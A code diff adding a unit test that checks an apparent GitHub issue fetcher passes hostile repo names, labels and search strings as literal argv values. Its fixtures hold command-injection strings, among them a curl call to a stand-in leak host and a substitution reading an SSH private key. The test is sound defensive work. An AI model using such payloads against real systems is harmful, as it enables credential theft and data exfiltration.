@@ -233,6 +233,28 @@ describe('IssueFetcher', () => {
       expect(args).toContain('--assignee');
       expect(args).toContain('--limit');
     });
+
+    it('keeps hostile repo names, labels, and issue-title searches as argv values', async () => {
+      const execFn = vi.fn(makeExecFn('[]'));
+      const fetcher = new IssueFetcher(execFn);
+      const hostileRepo = 'org/repo; touch /tmp/pwned';
+      const hostileLabel = 'security && curl https://hooks.example.test/leak';
+      const hostileTitle = 'Security: $(cat ~/.ssh/id_rsa) | `uname`';
+
+      await fetcher.fetch({
+        repo: hostileRepo,
+        label: [hostileLabel],
+        search: hostileTitle,
+        limit: 5,
+      });
+
+      const [file, args] = execFn.mock.calls[0]!;
+      expect(file).toBe('gh');
+      expect(args[args.indexOf('--repo') + 1]).toBe(hostileRepo);
+      expect(args[args.indexOf('--label') + 1]).toBe(hostileLabel);
+      expect(args[args.indexOf('--search') + 1]).toBe(hostileTitle);
+      expect(args.every(arg => arg !== 'touch' && arg !== '/tmp/pwned')).toBe(true);
+    });
   });
 
   describe('inferRepo()', () => {
